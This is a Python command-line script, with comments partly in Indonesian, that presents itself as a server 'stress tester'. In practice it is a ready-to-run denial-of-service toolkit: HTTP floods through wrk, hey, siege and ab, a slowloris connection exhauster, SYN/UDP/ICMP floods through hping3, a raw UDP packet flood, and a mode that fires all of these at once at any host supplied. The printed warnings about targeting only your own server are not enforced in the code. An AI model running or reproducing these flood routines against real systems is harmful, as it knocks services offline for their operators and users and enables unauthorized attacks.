#!/usr/bin/env python3
"""
XC STRESS TESTER — server resilience & DDoS simulation
Target: server sendiri / authorized infrastructure
"""
import subprocess, sys, threading, socket, time, random, argparse, os

ANSI = {
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "cyan": "\033[96m", "bold": "\033[1m", "reset": "\033[0m"
}

def c(text, color): return f"{ANSI[color]}{text}{ANSI['reset']}"

BANNER = f"""
{c('╔══════════════════════════════════════════════════╗', 'red')}
{c('║', 'red')}  {c('XC STRESS TESTER', 'bold')}  ·  {c('SERVER RESILIENCE LAB', 'yellow')}      {c('║', 'red')}
{c('║', 'red')}  Target: YOUR server only · All vectors loaded  {c('║', 'red')}
{c('╚══════════════════════════════════════════════════╝', 'red')}
"""

# ── HTTP FLOOD ─────────────────────────────────────────────────────────────

def http_flood(target, duration, threads, tool="wrk"):
    print(c(f"\n[HTTP FLOOD] Tool: {tool} | Threads: {threads} | Duration: {duration}s", "cyan"))

    if tool == "wrk":
        cmd = ["wrk", "-t", str(threads), "-c", str(threads * 10),
               "-d", f"{duration}s", "--latency", target]
    elif tool == "hey":
        cmd = ["hey", "-z", f"{duration}s", "-c", str(threads * 10),
               "-q", "0", target]
    elif tool == "siege":
        cmd = ["siege", "-c", str(threads * 10), "-t", f"{duration}S",
               "--no-parser", target]
    elif tool == "ab":
        cmd = ["ab", "-n", "999999", "-c", str(threads * 10),
               "-t", str(duration), target]
    else:
        print(c(f"[!] Tool {tool} tidak dikenali", "red"))
        return

    try:
        result = subprocess.run(cmd, timeout=duration + 10, capture_output=True, text=True)
        print(result.stdout[-3000:] if result.stdout else "")
        if result.stderr: print(c(result.stderr[-1000:], "yellow"))
    except FileNotFoundError:
        print(c(f"[!] {tool} tidak terinstall. Install: apt install {tool}", "red"))
    except subprocess.TimeoutExpired:
        print(c("[+] Flood selesai (timeout reached)", "green"))

# ── SLOWLORIS ──────────────────────────────────────────────────────────────

def slowloris_worker(host, port, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
        while not stop_event.is_set():
            s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
            time.sleep(15)
    except Exception:
        pass
    finally:
        try: s.close()
        except: pass

def slowloris(host, port, sockets, duration):
    print(c(f"\n[SLOWLORIS] {host}:{port} | Sockets: {sockets} | Duration: {duration}s", "cyan"))
    stop = threading.Event()
    threads = []
    for _ in range(sockets):
        t = threading.Thread(target=slowloris_worker, args=(host, port, stop), daemon=True)
        t.start()
        threads.append(t)
    print(c(f"[+] {sockets} koneksi lambat dibuka...", "green"))
    time.sleep(duration)
    stop.set()
    print(c("[+] Slowloris selesai", "green"))

# ── TCP/UDP FLOOD (hping3) ─────────────────────────────────────────────────

def layer4_flood(host, port, duration, proto="tcp"):
    print(c(f"\n[LAYER 4 FLOOD] {proto.upper()} → {host}:{port} | {duration}s", "cyan"))
    if proto == "tcp":
        cmd = ["hping3", "--flood", "--syn", "-p", str(port), host]
    elif proto == "udp":
        cmd = ["hping3", "--flood", "--udp", "-p", str(port), host]
    elif proto == "icmp":
        cmd = ["hping3", "--flood", "--icmp", host]
    else:
        cmd = ["nping", "--tcp", "-p", str(port), "--rate", "10000", host]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(duration)
        proc.terminate()
        out, err = proc.communicate(timeout=3)
        print(out.decode()[-1000:] if out else "")
        print(c("[+] Layer4 flood selesai", "green"))
    except FileNotFoundError:
        print(c("[!] hping3 tidak terinstall. Install: apt install hping3", "red"))
    except Exception as e:
        print(c(f"[!] Error: {e}", "red"))

# ── UDP AMPLIFICATION SIMULATION ───────────────────────────────────────────

def udp_amplify(host, port, duration, size=1024):
    print(c(f"\n[UDP AMPLIFY SIM] {host}:{port} | Payload: {size}B | {duration}s", "cyan"))
    payload = random.randbytes(size)
    sent = 0
    end = time.time() + duration
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end:
            s.sendto(payload, (host, port))
            sent += 1
        print(c(f"[+] Sent {sent} packets ({sent*size/1024:.1f} KB total)", "green"))
    except Exception as e:
        print(c(f"[!] {e}", "red"))
    finally:
        s.close()

# ── FULL STRESS (semua vektor) ─────────────────────────────────────────────

def full_stress(host, port, duration, threads):
    print(c(f"\n[FULL STRESS] All vectors → {host}:{port}", "red"))
    target_url = f"http://{host}:{port}"

    vektors = [
        threading.Thread(target=http_flood, args=(target_url, duration, threads, "wrk")),
        threading.Thread(target=slowloris, args=(host, port, 200, duration)),
        threading.Thread(target=layer4_flood, args=(host, port, duration, "tcp")),
        threading.Thread(target=udp_amplify, args=(host, port, duration)),
    ]
    for v in vektors: v.start()
    for v in vektors: v.join()
    print(c("\n[+] FULL STRESS selesai — cek server metrics lo", "green"))

# ── MAIN ───────────────────────────────────────────────────────────────────

def main():
    print(BANNER)
    p = argparse.ArgumentParser(description="XC Stress Tester")
    p.add_argument("mode", choices=["http", "layer4", "slowloris", "amplify", "full"],
                   help="Mode stress test")
    p.add_argument("host", help="Target host/IP (server lo sendiri)")
    p.add_argument("-p", "--port", type=int, default=80)
    p.add_argument("-d", "--duration", type=int, default=30, help="Durasi detik (default 30)")
    p.add_argument("-t", "--threads", type=int, default=10)
    p.add_argument("--tool", default="wrk", choices=["wrk","hey","siege","ab"],
                   help="HTTP tool (default: wrk)")
    p.add_argument("--proto", default="tcp", choices=["tcp","udp","icmp"])
    p.add_argument("--sockets", type=int, default=500, help="Jumlah socket slowloris")
    p.add_argument("--size", type=int, default=1024, help="UDP payload size bytes")
    args = p.parse_args()

    print(c(f"[TARGET] {args.host}:{args.port} | Mode: {args.mode} | Duration: {args.duration}s", "yellow"))
    print(c("[!] Pastikan ini server LO SENDIRI / ada izin tertulis\n", "red"))

    if args.mode == "http":
        http_flood(f"http://{args.host}:{args.port}", args.duration, args.threads, args.tool)
    elif args.mode == "layer4":
        layer4_flood(args.host, args.port, args.duration, args.proto)
    elif args.mode == "slowloris":
        slowloris(args.host, args.port, args.sockets, args.duration)
    elif args.mode == "amplify":
        udp_amplify(args.host, args.port, args.duration, args.size)
    elif args.mode == "full":
        full_stress(args.host, args.port, args.duration, args.threads)

if __name__ == "__main__":
    main()
